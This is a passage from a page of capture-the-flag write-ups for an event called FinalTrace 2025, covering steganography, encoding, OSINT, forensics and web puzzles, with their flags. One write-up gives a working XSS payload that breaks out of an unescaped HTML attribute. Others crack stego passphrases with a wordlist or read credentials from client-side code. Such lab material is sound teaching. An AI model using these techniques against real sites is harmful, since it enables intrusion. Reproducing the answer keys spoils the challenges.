id="step-1-stegseek-on-given-jpg"><span class="mr-2">Step 1: StegSeek on given JPG</span><a href="#step-1-stegseek-on-given-jpg" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>stegseek image.jpg -wl rockyou.txt
</pre></table></code></div></div><p>[Reveals hidden fl.txt containing flag. Passphrase for stegseek is ‘cyberpunk’.]</p><h4 id="step-2-use-python-code-to-group-binary-bits-by-7-and-convert-to-ascii"><span class="mr-2">Step 2: Use python code to group binary bits by 7 and convert to ASCII.</span><a href="#step-2-use-python-code-to-group-binary-bits-by-7-and-convert-to-ascii" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="n">binary_input</span> <span class="o">=</span> <span class="nf">input</span><span class="p">(</span><span class="sh">"</span><span class="s">Enter 7-bit binary (no spaces): </span><span class="sh">"</span><span class="p">)</span>
<span class="n">text</span> <span class="o">=</span> <span class="sh">''</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="nf">chr</span><span class="p">(</span><span class="nf">int</span><span class="p">(</span><span class="n">binary_input</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">7</span><span class="p">],</span> <span class="mi">2</span><span class="p">))</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nf">len</span><span class="p">(</span><span class="n">binary_input</span><span class="p">),</span> <span class="mi">7</span><span class="p">))</span>
<span class="nf">print</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>
</pre></table></code></div></div><p>[Converts binary into required flag.]</p><h3 id="flag"><span class="mr-2">Flag</span><a href="#flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>CYS{7h3RE_15_N0_E4D}
</pre></table></code></div></div><h2> Flag</h2><code> CYS{7h3RE_15_N0_E4D} </code><hr><h1 id="lost-core-pulse"> Lost Core Pulse <a href="/writeups/FinalTrace_2025/23-lost-core-pulse.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="lost-core-pulse"><span class="mr-2">Lost Core Pulse</span><a href="#lost-core-pulse" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><ul><li><strong>Category:</strong> Crypto<li><strong>Author:</strong> Varsaa H</ul><hr /><h2 id="challenge-description"><span class="mr-2">Challenge Description</span><a href="#challenge-description" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>The Eon city’s memory pulse went missing in a turbulent transmission. What remains in cipher.txt is cloaked with layers recognizable only to cryptographers—and those attentive to the patterns of Eon’s lost pulse.</p><p><em>Hint: Sometimes, signals are wrapped not once but twice.</em></p><hr /><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="initial-analysis"><span class="mr-2">Initial Analysis</span><a href="#initial-analysis" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><ul><li>Downloaded and inspected the file <code class="language-plaintext highlighter-rouge">cipher.txt</code>.<li>The content was a long string of what looked like hexadecimal characters.</ul><hr /><h3 id="tools-used"><span class="mr-2">Tools Used</span><a href="#tools-used" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><ul><li>Python (hex and base64 decoding)<li>CyberChef (for alternate handy decoding)<li>Any text editor</ul><hr /><h3 id="step-by-step-solution"><span class="mr-2">Step-by-Step Solution</span><a href="#step-by-step-solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><h4 id="step-1-hex-decode-the-ciphertxt"><span class="mr-2">Step 1: Hex Decode the cipher.txt</span><a href="#step-1-hex-decode-the-ciphertxt" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>with open(‘cipher.txt’) as f: data = bytes.fromhex(f.read()) print(data)</p><p>This produced a result that looked like base64: b’Q1lTezNiYjEyZGF9b3N0cHVsc2VFOTFiZTJkZTFkZjQ=’</p><h4 id="step-2-base64-decode-the-result"><span class="mr-2">Step 2: Base64 Decode the Result</span><a href="#step-2-base64-decode-the-result" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>import base64 flag = base64.b64decode(data).decode() print(flag)</p><p>text Output: CYS{3bb12d_lostpulse_91be2d}</p><p>This is the flag, revealed from the two encoding layers.</p><h3 id="flag"><span class="mr-2">Flag</span><a href="#flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>CYS{3bb12d_lostpulse_91be2d}</p><h2> Flag</h2><code> CYS{3bb12d_lostpulse_91be2d} </code><hr><h1 id="spectogram-shadows"> Spectogram Shadows <a href="/writeups/FinalTrace_2025/24-spectogram-shadows.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="spectogram-shadows"><span class="mr-2">Spectogram Shadows</span><a href="#spectogram-shadows" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p><strong>Category</strong>: Forensics <strong>Author</strong>: Suraj Kumar</p><h2 id="challenge-description"><span class="mr-2">Challenge Description</span><a href="#challenge-description" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>A wav audio file contains a hidden, encrypted flag visible in the spectrogram. The flag in the spectrogram was encrypted with the vigenere cipher. The key for the cipher is stored at the end of the file’s hex data. Several dummy encoded flags are present in WAV comment metadata (they are red herrings).</p><hr /><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="initial-analysis"><span class="mr-2">Initial Analysis</span><a href="#initial-analysis" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><ol><li>Open the WAV file and inspect metadata and appended data. The spectrogram shows a message (the encrypted flag) so the flag text is present in the audio itself (as visual data). The ciphertext visible in the spectrogram looks like ASCII when transcribed.<li>The key is appended at the end of the WAV file (in the file’s hex). The hint “vigenere” is encoded in rot13 base32 base64 base64” and added in audios metadata Title</ol><h3 id="tools-used"><span class="mr-2">Tools Used</span><a href="#tools-used" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><ul><li>cyberchef/Any online decoders<li><h2 id="audacityany-spectograph-tool"><span class="mr-2">audacity?any spectograph tool</span><a href="#audacityany-spectograph-tool" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></ul><h3 id="step-by-step-solution"><span class="mr-2">Step-by-step Solution</span><a href="#step-by-step-solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><h4 id="step-1-_find-key"><span class="mr-2">Step 1 _Find Key</span><a href="#step-1-_find-key" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Key is at the end of hex of the audio(“secretkey”)</p><h4 id="step-2-see-spectograph"><span class="mr-2">Step 2: See Spectograph</span><a href="#step-2-see-spectograph" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>See audio spectography to find the vigenere encoded flag(ucu{e9sh22_owmg7w})</p><h4 id="step-3--find-flag-using-the-discovered-key-to-decode-the-cipher"><span class="mr-2">Step 3 — Find flag using the discovered key to decode the cipher</span><a href="#step-3--find-flag-using-the-discovered-key-to-decode-the-cipher" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Giving the key will decode and return the original flag</p><h2 id="flag"><span class="mr-2">Flag</span><a href="#flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>``` cys{N9OO22_ESOO7S}</p><h2> Flag</h2><code> cys{N9OO22_ESOO7S} </code><hr><h1 id="poem-of-hidden-lies"> POEM OF HIDDEN LIES <a href="/writeups/FinalTrace_2025/25-poem-of-hidden-lies.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="poem-of-hidden-lies"><span class="mr-2">POEM OF HIDDEN LIES</span><a href="#poem-of-hidden-lies" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><ul><li><strong>Category</strong>: OSInt/Forensics/Text<li><strong>Author</strong>: S S Kishore Kumar</ul><h2 id="challenge-description"><span class="mr-2">Challenge Description</span><a href="#challenge-description" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Govindaraja a budding entreprenuer has writte a poem , Find clues from his poem, unravel his life and his hidden secrets and finally capture THE FLAG!!</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="initial-analysis"><span class="mr-2">Initial Analysis</span><a href="#initial-analysis" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>The diary entry leads to github and with further analysis leads to the flag.</p><h3 id="tools-used"><span class="mr-2">Tools Used</span><a href="#tools-used" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><ul><li>Steghide<li>Google.com<li>Google Drive<li>Base 64 encoder/decoder<li>Instagram<li>Github</ul><h3 id="step-by-step-solution"><span class="mr-2">Step-by-Step Solution</span><a href="#step-by-step-solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Step 1: [Find the github account] Upon analysing the file you find out the github handle Govindaraja-GopalaKrishna-Ricky and the Public-Talk rep . (All these names are in the initial challenge file but hidden)</p><h4 id="step-2-read-the-readmemd-file"><span class="mr-2">Step 2: [Read the readme.md file]</span><a href="#step-2-read-the-readmemd-file" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>After reading the readme file you find out a password “IAuditYou” and the word “Base64” in it. Which are crucial for next steps.</p><h4 id="step-3-finding-the-correct-file"><span class="mr-2">Step 3: [Finding the correct file]</span><a href="#step-3-finding-the-correct-file" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>There are multiple files in the rep , among which only one leads to the next step . Which is “RmluYWxUcmFjZQ==.zip” and RmluYWxUcmFjZQ== can be decoded to FinalTrace (Event name) using a base64 decoder.</p><h4 id="step-4-analyze-the-file"><span class="mr-2">Step 4: [Analyze the file]</span><a href="#step-4-analyze-the-file" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>The zip file is password protected with “IAuditYou” and there are 5 images name 1,2,3,4,5.jpg among which img 3 has a hidden text file embedded. (3 can be chosen easily as if you inspect challenge file closely the verses are 3.3,3.33,3.333)</p><h4 id="step-5-find-the-text-file-in-3jpg"><span class="mr-2">Step 5: [Find the text file in 3.jpg]</span><a href="#step-5-find-the-text-file-in-3jpg" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Using steghide and the passphrase same as before “IAuditYou” you get a second.txt file hidden in it.</p><h4 id="step-6-analyze-secondtxt"><span class="mr-2">Step 6: [Analyze second.txt]</span><a href="#step-6-analyze-secondtxt" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>The text file leads to a google drive link with a zip file of 3 images and a text file. The password for this is “QuantumLeap Inc.”. As second.txt says “However successful you become in life don’t forget where you came from.”. Which points to the challenge file which has the password.</p><h4 id="step-7-analyze-readme2txt"><span class="mr-2">Step 7: [Analyze readme2.txt]</span><a href="#step-7-analyze-readme2txt" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>readme2.txt says about the flag which is that “there is three images below out of these 3 , find the most liked one and see when they have created their youtube/instagram/twitter (oldest one)</p><p>CYS{month_year}</p><h4 id="step-7-find-the-flag"><span class="mr-2">Step 7: [Find the flag]</span><a href="#step-7-find-the-flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Among those images the egg is the most liked picture . And the insta account was created on 19th January</p><h3 id="flag"><span class="mr-2">Flag</span><a href="#flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p><code class="language-plaintext highlighter-rouge">CYS{january_2019}</code></p><h2> Flag</h2><code> CYS{january_2019} </code><hr><h1 id="mirror-of-minutes"> Mirror of Minutes <a href="/writeups/FinalTrace_2025/26-act-iii-mirror-of-minutes-xss-ctf-walkthrough.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="mirror-of-minutes"><span class="mr-2">Mirror of Minutes</span><a href="#mirror-of-minutes" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h2 id="quick-start"><span class="mr-2">Quick Start</span><a href="#quick-start" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="step-1-open-developer-console"><span class="mr-2">Step 1: Open Developer Console</span><a href="#step-1-open-developer-console" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><ul><li>Press <strong>F12</strong> on your keyboard<li>Click on the <strong>Console</strong> tab</ul><h3 id="step-2-execute-the-exploit"><span class="mr-2">Step 2: Execute the Exploit</span><a href="#step-2-execute-the-exploit" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Copy and paste this into the console:</p><div class="language-javascript highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre><span class="c1">// Inject XSS payload into the reflection data</span>
<span class="nx">reflections</span><span class="p">.</span><span class="nf">push</span><span class="p">({</span>
    <span class="na">timestamp</span><span class="p">:</span> <span class="nb">Date</span><span class="p">.</span><span class="nf">now</span><span class="p">(),</span>
    <span class="na">id</span><span class="p">:</span> <span class="dl">"</span><span class="s2">exploit</span><span class="dl">"</span><span class="p">,</span>
    <span class="na">mirror</span><span class="p">:</span> <span class="s2">`survivor" onclick="window.networkUtils.unlockMirror()`</span><span class="p">,</span>
    <span class="na">text</span><span class="p">:</span> <span class="dl">"</span><span class="s2">payload triggered</span><span class="dl">"</span><span class="p">,</span>
    <span class="na">contact</span><span class="p">:</span> <span class="dl">"</span><span class="s2">attacker@void</span><span class="dl">"</span>
<span class="p">});</span>

<span class="c1">// Re-render to inject the XSS</span>
<span class="nf">renderObservations</span><span class="p">();</span>

<span class="c1">// Click the injected element to trigger XSS</span>
<span class="nb">document</span><span class="p">.</span><span class="nf">querySelector</span><span class="p">(</span><span class="dl">'</span><span class="s1">[data-mirror]</span><span class="dl">'</span><span class="p">).</span><span class="nf">click</span><span class="p">();</span>

<span class="c1">// Verify and get flag</span>
<span class="nf">verifyLucidity</span><span class="p">();</span>

<span class="c1">// Display flag</span>
<span class="nf">alert</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">flagContent</span><span class="dl">'</span><span class="p">).</span><span class="nx">textContent</span><span class="p">);</span>
</pre></table></code></div></div><h3 id="step-3-get-the-flag"><span class="mr-2">Step 3: Get the Flag</span><a href="#step-3-get-the-flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>The flag will appear: <code class="language-plaintext highlighter-rouge">cys{m1rr0r_p4ss}</code></p><hr /><h2 id="how-it-works"><span class="mr-2">How It Works</span><a href="#how-it-works" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="the-vulnerability"><span class="mr-2">The Vulnerability</span><a href="#the-vulnerability" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>The <code class="language-plaintext highlighter-rouge">data-mirror</code> attribute is <strong>not escaped</strong>:</p><div class="language-javascript highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="c1">// Vulnerable code in renderObservations():</span>
<span class="s2">`&lt;div data-mirror="</span><span class="p">${</span><span class="nx">mirrorAttr</span><span class="p">}</span><span class="s2">" ...&gt;`</span>
<span class="c1">// mirrorAttr is never HTML-escaped!</span>
</pre></table></code></div></div><h3 id="the-exploit-chain"><span class="mr-2">The Exploit Chain</span><a href="#the-exploit-chain" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><ol><li><strong>Inject malicious mirror value</strong> - Break out of the data attribute with <code class="language-plaintext highlighter-rouge">"</code><li><strong>Add onclick event</strong> - <code class="language-plaintext highlighter-rouge">onclick="window.networkUtils.unlockMirror()"</code><li><strong>Re-render observations</strong> - Call <code class="language-plaintext highlighter-rouge">renderObservations()</code> to insert the XSS<li><strong>Trigger the event</strong> - Click on the observation item<li><strong>Unlock the flag</strong> - The XSS calls <code class="language-plaintext highlighter-rouge">unlockMirror()</code> which sets <code class="language-plaintext highlighter-rouge">isLucid = true</code><li><strong>Verify and display</strong> - Call <code class="language-plaintext highlighter-rouge">verifyLucidity()</code> to show the flag</ol><h3 id="why-this-works"><span class="mr-2">Why This Works</span><a href="#why-this-works" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>Injected HTML:
&lt;div data-mirror="survivor" onclick="window.networkUtils.unlockMirror()"&gt;
    ...
&lt;/div&gt;

When clicked → onclick fires → unlockMirror() executes → isLucid = true
</pre></table></code></div></div><hr /><h2 id="the-flag"><span class="mr-2">The Flag</span><a href="#the-flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>cys{m1rr0r_p4ss}
</pre></table></code></div></div><hr /><h2 id="key-concepts"><span class="mr-2">Key Concepts</span><a href="#key-concepts" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="table-wrapper"><table><thead><tr><th>Concept<th>Explanation<tbody><tr><td><strong>XSS</strong><td>Injecting JavaScript code through user input<tr><td><strong>Unescaped Attribute</strong><td>HTML special characters not converted to entities<tr><td><strong>DOM Injection</strong><td>Modifying page elements dynamically<tr><td><strong>Event Triggers</strong><td>Using click/load events to execute code<tr><td><strong>Hidden Functions</strong><td>Discovering unexposed functions via inspection</table></div><hr /><h2> Flag</h2><code> cys{m1rr0r_p4ss} </code><hr><h1 id="feed-it-the-fracture"> Feed It the Fracture <a href="/writeups/FinalTrace_2025/27-challenge-name.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge-name"><span class="mr-2">Challenge Name</span><a href="#challenge-name" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p><strong>Feed It the Fracture</strong></p><ul><li><strong>Category</strong>: Forensics (E)<li><strong>Author</strong>: Vignesh K S</ul><hr /><h2 id="challenge-description"><span class="mr-2">Challenge Description</span><a href="#challenge-description" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>An audio file contains a hidden passcode. Once you unlock the vault, you’ll find a series of clues — morse code, ASCII, Base64 — leading to the final flag.</p><hr /><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="initial-analysis"><span class="mr-2">Initial Analysis</span><a href="#initial-analysis" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Started by listening to the audio file. The dialogue hinted at a number sequence. There was also a password-protected zip file named <code class="language-plaintext highlighter-rouge">vault.zip</code>.</p><hr /><h3 id="tools-used"><span class="mr-2">Tools Used</span><a href="#tools-used" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><ul><li>Morse Code Decoder<li>ASCII to Text Converter<li>Base64 Decoder<li>Rentry.org</ul><hr /><h3 id="step-by-step-solution"><span class="mr-2">Step-by-Step Solution</span><a href="#step-by-step-solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><h4 id="step-1-decode-the-passcode-from-audio"><span class="mr-2">Step 1: Decode the Passcode from Audio</span><a href="#step-1-decode-the-passcode-from-audio" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>The conversation hinted at the pincode 600127.  
Removed the zeroes → got 6127.
</pre></table></code></div></div><p>Used <code class="language-plaintext highlighter-rouge">6127</code> to unlock <code class="language-plaintext highlighter-rouge">vault.zip</code>.</p><hr /><h4 id="step-2-solve-the-morse-code"><span class="mr-2">Step 2: Solve the Morse Code</span><a href="#step-2-solve-the-morse-code" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>Found a morse code file inside the zip.  
Decoded it to get a string.
</pre></table></code></div></div><hr /><h4 id="step-3-decode-ascii-in-the-url"><span class="mr-2">Step 3: Decode ASCII in the URL</span><a href="#step-3-decode-ascii-in-the-url" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>Converted ASCII values to text.  
Revealed a Base64 string.
</pre></table></code></div></div><hr /><h4 id="step-4-decode-base64"><span class="mr-2">Step 4: Decode Base64</span><a href="#step-4-decode-base64" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>Decoded the Base64 string to get a URL.
</pre></table></code></div></div><hr /><h4 id="step-5-visit-the-url"><span class="mr-2">Step 5: Visit the URL</span><a href="#step-5-visit-the-url" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>Opened the URL on rentry.org.  
Found the final flag.
</pre></table></code></div></div><hr /><h3 id="flag"><span class="mr-2">Flag</span><a href="#flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>CYS{INH4RM0N1C_DO0R_UNL0CK3D}
</pre></table></code></div></div><h2> Flag</h2><code> CYS{INH4RM0N1C_DO0R_UNL0CK3D} </code><hr><h1 id="phantom-fingerprints"> Phantom Fingerprints <a href="/writeups/FinalTrace_2025/28--category-forensics.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><p>##</p><ul><li><strong>Category</strong>: [Forensics]<li><strong>Author</strong>: [Htarizzs]</ul><h2 id="challenge-description"><span class="mr-2">Challenge Description</span><a href="#challenge-description" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>[Use the provided netcat service and query logs to identify and analyze the activity of a phantom user whose fingerprints appear in the device logs, but who does not correspond to any registered account. Find and submit their session’s flag.]</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="initial-analysis"><span class="mr-2">Initial Analysis</span><a href="#initial-analysis" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><ul><li><strong>Reconnaissance</strong> Begin by connecting to the provided netcat service (e.g., <code class="language-plaintext highlighter-rouge">nc challenge.host 1337</code>). Review the welcome message, available commands (usually presented with a help command), and the structure of returned data.<li><strong>Information Gathering</strong> Use commands like show logs, query user <id>, query fingerprint <id>, etc., to get an inventory of normal and phantom records, paying attention to any IDs, timestamps, or unusual entries.</id></id></ul><h3 id="tools-used"><span class="mr-2">Tools Used</span><a href="#tools-used" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><ul><li>[netcat (nc)]<li>[python3 (py)]</ul><h3 id="step-by-step-solution"><span class="mr-2">Step-by-Step Solution</span><a href="#step-by-step-solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><h4 id="step-1-connect--explore"><span class="mr-2">Step 1: [Connect &amp; Explore]</span><a href="#step-1-connect--explore" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>nc localhost 1337
help
show logs
</pre></table></code></div></div><p>[The terminal is bought up, which will only work with specific commands which are specified in help.]</p><h4 id="step-2-find-the-phantom-user"><span class="mr-2">Step 2: [Find the phantom user]</span><a href="#step-2-find-the-phantom-user" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>query user 0x9999
query fingerprint fp9999
</pre></table></code></div></div><p>[Phantom(Unknown) user is found out, and try inspecting their fingerprint to get the flag in base64 format]</p><h4 id="step-3-decode-the-base64-string"><span class="mr-2">Step 3: [Decode the base64 string]</span><a href="#step-3-decode-the-base64-string" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Decoding the base64 string obtained will give the flag</p><h3 id="flag"><span class="mr-2">Flag</span><a href="#flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>CYS{ph4n7om_v3n0m}
</pre></table></code></div></div><h2> Flag</h2><code> CYS{ph4n7om_v3n0m} </code><hr><h1 id="to-hehe-with-lyra-s-echoes"> To Hehe with Lyra's Echoes <a href="/writeups/FinalTrace_2025/29-ToHehewithLyrasEchoes.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h1 id="basically-youre-treated-with-the-link">Basically you’re treated with the link.</h1><p>https://echositee.vercel.app/</p><p>If you open the site, it’ll lead you to the login page where you’ll be asked for a username and the password. But don’t you worry because if you open</p><p>Inspect -&gt; JavaScript segment of the code</p><p>You’ll see username = lyra Password = Base16 version of $#1n0332</p><p>Decode it and then enter the site The site is broken with not visible images.</p><p>From there, get the steg image (the third image in the site)</p><p><img src="image-1.png" alt="alt text" /></p><ul><li>Also if you press it, you may see a flag like thing, don’t worry it’s a RED herring.</ul><p>Then if you get echoes.jpg and do</p><p>steghide extract -sf echoes.jpg</p><p>And then for the passphrase, put $#1n0332 because I have already given in the description that her passwords became the same everywhere, so putting it leads you to get a Drive link</p><p>If you open the Drive Link, you’ll be rewarded with a PDF.</p><p>If you open the PDF, you can see that some texts are redacted. But no issues because if you copy all the texts and put in a notepad.</p><p>As you can see after this process, everything makes sense until in the end, there is random 